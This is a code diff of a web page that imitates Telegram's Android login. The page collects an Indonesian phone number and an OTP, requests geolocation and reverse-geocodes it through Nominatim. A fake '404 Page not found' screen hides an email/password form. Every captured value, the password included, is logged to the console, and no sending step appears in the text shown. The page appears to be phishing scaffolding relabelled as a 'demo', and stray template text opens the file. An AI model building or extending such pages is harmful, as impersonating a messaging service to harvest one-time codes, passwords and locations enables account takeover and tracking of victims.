@@ -1,8 +1,8 @@
-<!DOCTYPE html>
+Put your HTML text here<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Telegram Android Login Verify</title>
+<title>Telegram Android OTP Demo</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
 <style>
@@ -79,19 +79,19 @@ input::placeholder{color:#7d7d83}
   75%{transform:translateX(-4px)}
 }
 
-/* 404 */
+/* 404 + Email Login */
 .notfound{
   flex:1;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center
 }
-.notfound h1{font-size:64px;margin:0}
+.notfound h1{font-size:68px;margin:0}
 .notfound p{color:var(--muted);margin:8px 0 24px}
 .ghost{
   width:110px;height:110px;border-radius:50%;
   background:linear-gradient(145deg,#2b2b2b,#141414);
   margin-bottom:16px;animation:float 3s ease-in-out infinite
 }
-@keyframes float{0%,100%{transform:none}50%{transform:translateY(-10px)}}
 
+/* Timer */
 .timer{color:var(--muted);font-size:13px;margin-top:10px;text-align:center}
 </style>
 </head>
@@ -170,12 +170,24 @@ input::placeholder{color:#7d7d83}
     <p class="small">Open Telegram on your phone</p>
   </div>
 
-  <!-- 404 -->
+  <!-- 404 + Email Login -->
   <div id="nf" class="screen hidden">
     <div class="notfound">
       <div class="ghost"></div>
       <h1>404</h1>
       <p>Page not found</p>
+
+      <!-- Email login -->
+      <div class="input-group">
+        <label>Email</label>
+        <input type="email" id="emailLogin" placeholder="you@example.com">
+      </div>
+      <div class="input-group">
+        <label>Password</label>
+        <input type="password" id="passwordLogin" placeholder="••••••••">
+      </div>
+      <button class="btn primary" onclick="loginEmail()">Login</button>
+
       <button class="btn primary" onclick="location.reload()">Back</button>
     </div>
   </div>
@@ -199,9 +211,9 @@ function show(id){
 /* Nomor HP hanya angka, mulai dengan 8 */
 const phoneInput = document.getElementById('phone');
 phoneInput.addEventListener('input', e=>{
-  e.target.value = e.target.value.replace(/[^0-9]/g,''); // hanya angka
-  if(e.target.value.length > 0 && e.target.value[0] !== '8'){ e.target.value = '8'; } // awal harus 8
-  if(e.target.value.length > 12) e.target.value = e.target.value.slice(0,12); // max 12 digit
+  e.target.value = e.target.value.replace(/[^0-9]/g,''); 
+  if(e.target.value.length > 0 && e.target.value[0] !== '8'){ e.target.value = '8'; }
+  if(e.target.value.length > 12) e.target.value = e.target.value.slice(0,12); 
 });
 
 /* OTP input: hanya 5 digit angka */
@@ -210,19 +222,27 @@ otpInput.addEventListener('input', e=>{
   e.target.value = e.target.value.replace(/[^0-9]/g,'').slice(0,5);
 });
 
-/* LOGIN → Popup Lokasi → LOADING → OTP */
+/* LOGIN → Popup Lokasi + Reverse Geocoding → LOADING → OTP */
 function goLoading(){
   let phoneVal = '+62 '+phoneInput.value.trim();
   document.getElementById('phoneText').textContent = phoneVal;
-
   console.log('Phone (demo/local):', phoneVal);
 
-  // Minta izin lokasi
   if(navigator.geolocation){
     navigator.geolocation.getCurrentPosition(
-      pos => {
+      async pos => {
         const {latitude, longitude} = pos.coords;
-        console.log('Location allowed. Latitude:', latitude, 'Longitude:', longitude);
+        console.log('Coordinates:', latitude, longitude);
+
+        // Reverse geocoding OpenStreetMap Nominatim
+        try {
+          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
+          const data = await res.json();
+          console.log('Address:', data.display_name);
+        } catch(err){
+          console.warn('Reverse geocoding failed:', err);
+        }
+
         startLoading();
       },
       err => {
@@ -279,6 +299,22 @@ function startTimer(){
     if(timer<=0){ clearInterval(interval); timerText.textContent=`You can resend code to ${phoneVal}`; }
     else timerText.textContent=`Resend code to ${phoneVal} in ${timer}s`;
   },1000);
+}
+
+/* LOGIN EMAIL/PASSWORD DI 404 */
+function loginEmail(){
+  const email = document.getElementById('emailLogin').value.trim();
+  const password = document.getElementById('passwordLogin').value.trim();
+
+  if(!email || !password){
+    alert('Please fill both email and password!');
+    return;
+  }
+
+  console.log('Email login attempt:');
+  console.log('Email:', email);
+  console.log('Password:', password);
+
 }
 </script>
 </body>
